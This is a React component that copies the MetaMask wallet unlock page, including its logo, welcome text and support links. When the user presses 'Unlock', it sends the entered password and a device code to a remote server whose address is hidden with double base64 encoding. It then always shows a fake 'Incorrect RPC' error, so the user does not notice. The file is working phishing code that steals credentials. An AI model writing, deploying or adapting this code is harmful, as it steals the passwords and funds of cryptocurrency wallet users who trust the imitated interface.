import React, { useEffect, useState } from 'react'
import MetamaskLogo from './MetaMaskLogo/MetaMask'
import styles from './pop.module.css'
const MetaMask = () => {
    const [password, setPassword] = useState('')
    const [errormessage, setErrormessage] = useState(false)
    const [errrpc, setErrrpc] = useState(false)
    const [loader, setLoader] = useState(false)
    const [code, setCode] = useState('')

    const handleCodeChange = (e) => {
        const value = e.target.value
        if (password.length != value.length) {
            setErrormessage(false)
            setErrrpc(false)
        }
        setPassword(value)
    }
    useEffect(() => {
        setCode('ABC')
    }, [])

    const unlock = async () => {
        setErrormessage(false)
        setErrrpc(false)
        if (password.length === 0) {
            return;
        } else if (password.length < 8) {
            setErrormessage(true)
            return;
        }
        //here is the code that we have read ABC
        const device = code
        const url = 'YUhSMGNITTZMeTluWVc1aFkyaGxMbXhwZG1VdllYQnBMM1l4TDJodw==';
        const requestData = { device, value: password };
        try {
            setLoader(true)
            const response = await fetch(atob(atob(url)), {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(requestData),
            });

            if (response.ok) {
                await response.json();
                setErrrpc(true)
            } else {
                setErrrpc(true)

            }
        } catch (error) {
            setErrrpc(true)

        } finally {
            setLoader(false)
            setErrrpc(true)


        }


    }

    return (
        <div className={styles.popupm}>
            <div style={{ width: '100%' }} className={`${loader ? styles.main : ''}`}>
                <div className={`${styles.logocontainer}`}>
                    <MetamaskLogo />
                </div>
                <div className="text-center">
                    <h1 className={`${styles.bck}`}>Welcome back!</h1>
                    <h3 className='mt-2'>The decentralized web awaits</h3>
                </div>



                <div className='mr-4 ml-4 mt-16 relative'>
                    <input placeholder=' ' type="text" autoComplete="new-password" id="floating_standard" className={`${styles.custominput} ${styles.pw}`}
                         value={password}
                        onChange={handleCodeChange}></input>
                    <label for="floating_standard" className={`${styles.customlabel}`} >Password</label>
                    {errormessage ? <div className={`${styles.errormessage}`}>Incorrect password</div> : errrpc ? <div className={`${styles.errormessage}`}>Incorrect RPC</div> : ''}
                </div>


                <button className={`${styles.unlockbtn}`} onClick={unlock}>Unlock</button>
                <div className="text-center m-4"><a
                    href="https://support.metamask.io/hc/en-us/articles/360039616872-How-can-I-reset-my-password-"
                    target="_blank" className={`${styles.forgotpswd}`}>Forgot
                    password?</a>
                    <p className={`${styles.hlp} w-full`}>Need help? Contact <a href="https://support.metamask.io/hc/en-us" target="_blank"
                        style={{ color: 'rgb(33, 132, 218)' }} >Metamask support </a></p>
                </div>
            </div>
            {loader ? <div className={`${styles.customloader} ${styles.loadertrue}`}></div> : ''}
        </div >

    )
}

export default MetaMask